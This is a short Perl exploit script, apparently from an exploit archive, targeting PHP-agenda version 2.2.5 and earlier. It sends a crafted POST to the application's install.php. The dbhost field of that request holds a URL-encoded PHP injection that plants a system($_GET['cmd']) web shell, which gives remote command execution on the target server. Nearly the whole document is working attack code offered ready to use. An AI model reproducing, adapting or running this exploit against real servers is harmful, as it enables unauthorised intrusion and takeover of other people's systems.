# use Socket;                   # INET
use strict;
use IO::Socket;               # Socket work


my $PAGE = "";  # The text sent to - appended later.


my $host = $ARGV[0];
my $port = $ARGV[1];
my $path = $ARGV[2];




print "*******   Salvatore \"drosophila\" Fresta   *******\n";
print "\n";
print "[+] Application: PHP-agenda\n";
print "[+] Version: <= 2.2.5\n";
print "[+] Website: http://php-agenda.sourceforge.net\n";
print "\n";
print "[+] Bugs: [A] Remote File Overwriting\n";
print "\n";
print "[+] Exploitation: Remote\n";
print "[+] Date: 10 Apr 2009\n";
print "\n";
print "[+] Discovered by: Salvatore \"drosophila\" Fresta\n";
print "[+] Author: Salvatore \"drosophila\" Fresta\n";
print "[+] Contact: e-mail: drosophilaxxx\@gmail.com\n\n";

print "[x] Coded by QUAKERDOOMER for WinAutoPWN\n";
print "[x] http://solidmecca.co.nr\n";
print "[x] (quakerdoomer [[<<at>>]] fmguy.com)\n\n";


print "*************************************************\n";






$PAGE  = "POST ";
$PAGE .= $path;
$PAGE .= "/install.php HTTP/1.1\r\n";


    $PAGE .= "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\r\n";
    $PAGE .= "Accept-Language: en-us\r\n";
    $PAGE .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $PAGE .= "UA-CPU: x86\r\n";
    $PAGE .= "Accept-Encoding: gzip, deflate\r\n";

$PAGE .=  "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$PAGE .=  "Host: www.site.com\r\n";
$PAGE .=  "Content-Length: 60\r\n";
$PAGE .=  "Connection: Keep-Alive\r\n";
$PAGE .=  "Cache-Control: no-cache\r\n";
$PAGE .=  "Cookie: PHPSESSID=oo32tv475nj8hgif5esb0bvta3\r\n\r\n";

$PAGE .=  "dbhost=%27%3B+system%28%24_GET%5B%27cmd%27%5D%29%3B+echo+%27\r\n\r\n";





  # Now we send our data.
    # Note that this is just quick and dirty, so I'm using a perl module
    # to do the network dirty work for me.
    my $sock = IO::Socket::INET->new(PeerAddr => $host,
				     PeerPort => 'http(80)',
				     Proto    => 'tcp');

    die "Cannot create socket : $!" unless $sock;
    
    $sock->autoflush();
    $sock->print("$PAGE");


exit(0);
